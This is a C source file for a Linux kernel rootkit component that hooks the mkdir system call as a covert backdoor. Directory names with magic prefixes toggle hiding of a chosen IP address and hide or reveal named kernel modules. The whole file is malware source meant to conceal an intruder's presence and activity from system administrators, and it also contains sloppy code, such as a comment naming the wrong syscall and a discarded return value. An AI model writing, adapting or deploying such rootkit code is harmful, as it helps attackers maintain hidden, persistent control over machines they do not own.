//
// Created by sciver on 10/20/22.
//

#include "hook_mkdir.h"
#include "log_clean.h"
#include "hide_driver.h"
asmlinkage long (*orig_mkdir)(const struct pt_regs *);

/*
 * This will be set to true if we want to hide us from "who"
 */
bool HIDE = false;

/*
 *
 */
char dir_name[NAME_MAX] = {0};
char HIDDEN_IP[NAME_MAX] = {0};

/*
 *
 * The hook for sys_rmdir()
 * Used for trigger the HIDE boolean and pass the HIDE_IP param
 */
asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);
    else
        return -EFAULT;

    if (strncmp(pathname, BACKDOOR_PREFIX_HIDE, strlen(BACKDOOR_PREFIX_HIDE)) == 0)
    {
        HIDE = true;
        // HIDDEN_IP = &pathname[strlen(BACKDOOR_PREFIX_HIDE)];
        strncpy(HIDDEN_IP, &pathname[strlen(BACKDOOR_PREFIX_HIDE)], IPV4LEN);

        // get some...start trouble, index should be strlen(BACKDOOR_PREFIX_HIDE) + 1
        printk("in-hook_mkdir:HIDDEN_IP %s\n", HIDDEN_IP);
    }

    if (strncmp(pathname, BACKDOOR_PREFIX_UNHIDE, strlen(BACKDOOR_PREFIX_UNHIDE)) == 0)
    {
        HIDE = false;
    }

    if (strncmp(pathname, BACKDOOR_PREFIX_MODULE, strlen(BACKDOOR_PREFIX_MODULE)) == 0)
    {
        char __user *buf = (char *)regs->di;
        char name[NAME_MAX] = {0};
        char name1[NAME_MAX] = {0};
        long error = strncpy_from_user(name, buf, NAME_MAX);
        // if (error > 0)
        //     printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", name);
        int i=0;
        int j=1;
        while(name[j]!=NULL)
        {
            name1[i]=name[j];
            i++;
            j++;
        }
        //printk(KERN_INFO "Hello world!A filename:%s \n",name1);
        if(name[0]=='9')
        {
            hidemodule(name1);
        }
        else if(name[0]=='0')
        {
            showmodule(name1);
        }
    }


    orig_mkdir(regs);
    return 0;
}
